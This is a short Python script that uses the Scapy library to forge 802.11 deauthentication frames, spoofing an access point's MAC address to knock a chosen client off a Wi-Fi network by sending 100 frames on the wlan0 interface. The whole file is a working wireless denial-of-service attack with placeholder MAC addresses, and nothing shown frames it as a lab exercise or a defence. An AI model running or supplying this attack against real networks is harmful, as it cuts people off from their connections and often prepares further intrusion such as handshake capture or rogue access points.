#!/usr/bin/env python3
from scapy.all import RadioTap,Dot11,Dot11Deauth,send
 
ap_mac = "11:22:33:44:55:66"  # MAC address of access point to target
client_mac = "aa:bb:cc:dd:ee:ff"  # MAC address of client to target
 
pkt = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
send(pkt, iface="wlan0", count=100)
